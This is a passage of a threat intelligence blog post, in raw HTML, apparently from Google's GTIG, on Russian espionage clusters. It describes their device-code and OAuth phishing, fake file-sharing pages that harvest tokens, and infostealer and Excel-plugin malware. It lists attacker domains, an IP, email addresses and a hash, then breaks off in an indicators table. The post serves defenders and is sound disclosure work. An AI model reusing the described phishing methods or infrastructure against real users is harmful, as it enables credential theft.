href=\"https://www.microsoft.com/en-us/security/blog/2026/07/31/captivecrunch-midnight-blizzard-targets-travelers-worldwide-for-malware-delivery-and-credential-theft/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Microsoft detailed Midnight Blizzard activity</span></a><span style=\"vertical-align: baseline;\"> leveraging captive portals on hospitality sector networks to serve malware or gain access to Microsoft accounts via device code phishing. </span></p>\n<p><span style=\"vertical-align: baseline;\">For the duration of its lifetime, the set of infrastructure used in the captive portal campaign appeared to be used in multiple ways by the threat actor. GTIG linked this infrastructure directly to the other authentication-focused and malware operations conducted by UNC7005 dating back to April 2026.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Connections between captive portal campaign and other UNC7005 activity\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_19_Connections_between_captive_port.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 19. Connections between captive portal campaign and other UNC7005 activity</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">A domain linked to the hospitality captive portal domain shares an Internet Protocol (IP) resolution with an UNC7005 domain used in an earlier device code phishing operation. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Between July 16 and July 23, 2026, UNC7005 registered three Microsoft Outlook Web Access (OWA) themed domains (</span><code style=\"vertical-align: baseline;\">owa-ms365[.]com</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">m365-owa[.]com</code><span style=\"vertical-align: baseline;\">, and </span><code style=\"vertical-align: baseline;\">ms365-device[.]com</code><span style=\"vertical-align: baseline;\">), which were later linked to the hospitality captive portal campaign, using the email </span><code style=\"vertical-align: baseline;\">chikolimdrid@gmail.com</code><span style=\"vertical-align: baseline;\">. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">That attacker email was previously used to register an earlier domain masquerading as Microsoft, </span><code style=\"vertical-align: baseline;\">ms365-live.com</code><span style=\"vertical-align: baseline;\"> which resolved to IP </span><code style=\"vertical-align: baseline;\">104.194.159[.]150</code><span style=\"vertical-align: baseline;\">. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">In April 2026, a domain used in the GLOBSEC-themed Microsoft device code phishing operation previously discussed in this blog,</span><code style=\"vertical-align: baseline;\"> my-invite[.]org</code><span style=\"vertical-align: baseline;\">, resolved to IP </span><code style=\"vertical-align: baseline;\">104.194.159[.]150</code><span style=\"vertical-align: baseline;\">. </span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">The actor also used additional domains spoofing Microsoft services in other operations. An earlier attacker-controlled domain spoofing Microsoft in late April 2026 (</span><code style=\"vertical-align: baseline;\">statistic-ms[.]live</code><span style=\"vertical-align: baseline;\">) was used by UNC7005 as C2 for Go malware we call ENGINELIGHT. This malware was sent in a limited phishing operation in early May 2026 from the attacker-controlled account </span><code style=\"vertical-align: baseline;\">bounce@chamber-ua.org</code><span style=\"vertical-align: baseline;\">,</span><span style=\"vertical-align: baseline;\"> along with a domain spoofing WhatsApp (</span><code style=\"vertical-align: baseline;\">wa-connect[.]eu</code><span style=\"vertical-align: baseline;\">). Additionally, the attacker email used to register </span><code style=\"vertical-align: baseline;\">statistic-ms[.]live</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">keyereaonkendrick4@gmail.com</code><span style=\"vertical-align: baseline;\">) was used in the previously documented MaaS operation in late May 2026.</span></p>\n<p><span style=\"vertical-align: baseline;\">We have also observed tooling overlaps between campaigns conducted by UNC7005 and the tools reported to have been deployed in the captive portal operation. Samples of the CHERRYPIE PowerShell infostealer (also known as ChocoShell) contain numerous artifacts suggesting the malware is generated by a large language model (LLM). The prolific function comments mention an infostealer and specific function offsets noting functionality are located in the binary. Given GTIG’s observation of this threat actor leveraging MaaS in operations and functional overlaps between the malware families, such as consistency in types of data targeted by the malware, we suspect CHERRYPIE may be based on an infostealer purchased from MaaS operators.</span></p>\n<h3><span style=\"vertical-align: baseline;\">UNC5976</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG began tracking OAuth related activity from UNC5976, a suspected Russian cyber espionage cluster with an authentication focus, in March 2026. We believe this cluster to be distinct from UNC6293 and UNC7005.</span></p>\n<p><span style=\"vertical-align: baseline;\">One of the main themes of UNC5976 operations was the use of OAuth phishing techniques and automation of token collection via abuse of cloud infrastructure. To perform these OAuth phishing campaigns, UNC5976 purchased domains, usually using file sharing related domain names, and then created a cloud project related to that domain. These domains host a fake file sharing page. After a target visits the page for a few seconds, the page displays a pop up login dialog.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Fake file sharing page\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_20_Fake_file_sharing_page.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 20: Fake file sharing page</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">If the target clicks the “Continue with Google” link they are taken to a legitimate Google OAuth login page, asking the target to sign in to continue:</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"OAuth login page from verify-drive[.]com\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_21_OAuth_login_page_from_verify-dri.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 21: OAuth login page from verify-drive[.]com</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">After authenticating, the target was redirected to a Google Cloud project URL. The cloud project hosted malicious scripts that retrieve the authentication token from the URL and save it for the operator to later retrieve.</span></p>\n<p><span style=\"vertical-align: baseline;\">Within approximately three months of initial discovery and disruption by GTIG, UNC5976 created at least twelve new domains and related infrastructure. In response, GTIG took steps to disable these cloud projects and disrupt these phishing activities. GTIG now assesses that UNC5976 is migrating away from Google infrastructure to other providers to host part of their phishing infrastructure.</span></p>\n<p><span style=\"vertical-align: baseline;\">In addition to these phishing pages, we have also observed UNC5976 leverage a malicious Excel plugin, which we named HEADRUSH. In April 2026, GTIG observed a HEADRUSH sample (</span><code style=\"vertical-align: baseline;\">2c7f4165967d6f7737b3fef87959846920b57a5368b531ad1427c7214d4c41a2</code><span style=\"vertical-align: baseline;\">) that ultimately led to an HTML Application (HTA) downloader. UNC5976 distributed this malware using a domain that impersonated a research institute in Ukraine and may have targeted a Ukrainian aerospace and imaging company. Unfortunately, GTIG was unable to determine the full extent of the infection chain at the time.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Attribution</span></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG assesses with high confidence that these three threat clusters - UNC6293, UNC7005, and UNC5976 - possess a Russian nexus, based on high-level targeting patterns, phishing themes, and shared operational techniques. While these operations often appear unique on the surface, several high-level TTPs used by UNC6293 and UNC7005 harken back to older, attributed ICE RELIC phishing operations between 2021 and 2024. </span></p>\n<h3><span style=\"vertical-align: baseline;\">ICE RELIC, UNC6293, AND UNC7005</span></h3>\n<p><span style=\"vertical-align: baseline;\">GTIG assesses with moderate confidence that UNC6293 and UNC7005 are related to a subcluster of ICE RELIC that we associate with initial access operations. As such, UNC6293 and UNC7005 share operational methodologies but operate different infrastructure and tolerate different thresholds of OPSEC. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">There is significant overlap in target industries (academia, NGOs, diplomacy, and defense) and geographic regions between historical ICE RELIC phishing operations and current UNC6293 and UNC7005 campaigns. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">These groups continue to use specific legacy themes, such as diplomatic event invitations and specific references to wine, which have previously been documented in ICE RELIC activity.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">All clusters heavily rely on commercial residential proxies for post-compromise activity. </span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Distinct, but noteworthy: UNC5976</span></h3>\n<p><span style=\"vertical-align: baseline;\">UNC5976 remains distinct from the UNC6293 and UNC7005 clusters, potentially reflecting differing strategic mandates and potential alignment with alternative Russian intelligence services. </span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Its operational focus is primarily centered on the military, aerospace, defense industrial base, and NGOs/think tanks. Much of the group’s geographic targeting has centered on Ukraine and Armenia. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">UNC5976 uses dedicated infrastructure for post-compromise activity rather than residential proxies. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">UNC5976 has a much heavier malware and tooling footprint than the ICE RELIC-linked clusters, despite also conducting OAuth operations. </span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Remediation and Hardening</span></h3>\n<p><span style=\"vertical-align: baseline;\">At Google, we prioritize user safety. Google will actively disable known actor accounts and where possible, secure victims to remove access to known compromised accounts. We have taken action against infrastructure used to host malicious content in these operations. We strongly recommend users to not proceed past warnings for suspicious websites. Check the URL in your browser before entering credentials or authenticating to any website. Always contact official organizers directly using contact details found outside of the invitation to confirm the legitimacy of any invitation from an unknown contact. Although outreach over email or messenger applications may come from someone who appears to be a legitimate person, please consider the possibility that the persona may be spoofed.  </span></p>\n<p><span style=\"vertical-align: baseline;\">App passwords are not recommended and unnecessary in most cases. App passwords are </span><span style=\"font-style: italic; vertical-align: baseline;\">not</span><span style=\"vertical-align: baseline;\"> tools for account or identity verification. Do not share an app password with anyone else. We recommend revoking any legacy app passwords tied to devices that are lost, stolen, or no longer in use. If you believe you may have set an app password related to this campaign, follow </span><a href=\"https://support.google.com/accounts/answer/185833?hl=en#zippy=%2Cremove-app-passwords\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">instructions</span></a><span style=\"vertical-align: baseline;\"> to remove app passwords from your account as soon as possible. App passwords can be removed at any time.</span></p>\n<p><span style=\"vertical-align: baseline;\">In specific scenarios, to protect users from deceptive apps, we display a </span><a href=\"https://support.google.com/google-ads/answer/7454865?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">warning “unverified app” screen</span></a><span style=\"vertical-align: baseline;\"> before showing users the OAuth consent screen for authentication for unverified, testing mode cloud projects with permissions scopes considered sensitive. </span></p>\n<p><span style=\"vertical-align: baseline;\">High-risk users should consider Google’s enhanced security resources such as the </span><a href=\"https://landing.google.com/intl/en_in/advancedprotection/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Advanced Protection Program</span></a><span style=\"vertical-align: baseline;\"> (APP). Participation in the APP prevents accounts from creating app passwords due to higher security requirements. Enterprise customers of Google Cloud can disable App Specific Passwords by restricting </span><a href=\"https://knowledge.workspace.google.com/admin/security/protect-your-business-with-2-step-verification\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">2-Step verification to “Only Security Keys”</span></a><span style=\"vertical-align: baseline;\"> or enrolling users into the </span><a href=\"https://knowledge.workspace.google.com/admin/security/enable-user-enrollment-in-the-advanced-protection-program#enable\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Advanced Protection Program</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">Threat actors are continually targeting victim’s personal messaging applications and performing device linking attacks. Organizations and high risk individuals relying on these applications should continue to harden defences by:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Enforcing registration locks and two factor authentication where possible to prevent an adversary from registering an account via stolen SMS verification codes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Establish routine device audit checks for “linked devices” on both corporate and personal devices </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Leverage Safety numbers/codes to validate users via off platform communication channels </span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Outlook and Implications</span></h3>\n<p><span style=\"vertical-align: baseline;\">These clusters of Russia’s authentication-focused cyber espionage operations target multiple types of authentication using legitimate features and infrastructure, ranging from app passwords to device linking. In particular, their creative abuse of legitimate features to compromise accounts makes tracking legitimate and malicious account access more challenging. The accounts these groups target are often personal, rather than corporate domain-joined accounts, creating a visibility gap for monitoring compromise from an organizational perspective. The likely use of encrypted messenger applications instead of email for initial outreach also presents a challenge to defenders hoping to track and remediate abuse. The combination of these tactics not only enables the attacker to conduct quick-turnaround exfiltration operations, but also presents opportunities for the attacker to further phish targets of interest from compromised, legitimate accounts. </span></p>\n<p><span style=\"vertical-align: baseline;\">The tactics adopted by these actors obfuscate threat actor activity and make attribution more challenging. Although GTIG now tracks more UNC6293-controlled infrastructure than we did in our previous analysis, the volume of infrastructure that they use is still limited in comparison to other Russian espionage operations. UNC7005’s use of MaaS and LLMs to enable malware operations further pushes these operations into attribution and remediation gray areas. These choices also lessen the time needed to develop and stage tooling for operations, enabling fast-turnaround operations with bespoke tools.</span></p>\n<p><span style=\"vertical-align: baseline;\">As a result of these changes in modus operandi by Russian-state backed attackers, individuals working in the target verticals of these clusters must remain wary of any outreach by unverified, though seemingly familiar or legitimate, personas or organizations. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Acknowledgements</span></h3>\n<p><span style=\"vertical-align: baseline;\">We would like to thank partners across the industry for their collaboration in helping to track and disrupt parts of these operations, including but not limited to our partners at Anthropic, Black Lotus Labs at Lumen Technologies, Microsoft Threat Intelligence Center (MSTIC), and the Polish Military Counterintelligence Service (SKW) and WhatsApp. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Indicators of Compromise (IOCs)</span></h3>\n<p><span style=\"vertical-align: baseline;\">To assist the wider community in hunting and identifying activity outlined in this blog post, we have included indicators of compromise (IOCs) in a GTI Collection for registered users.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Network Indicators</span></h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Indicator</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Attribution</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px soli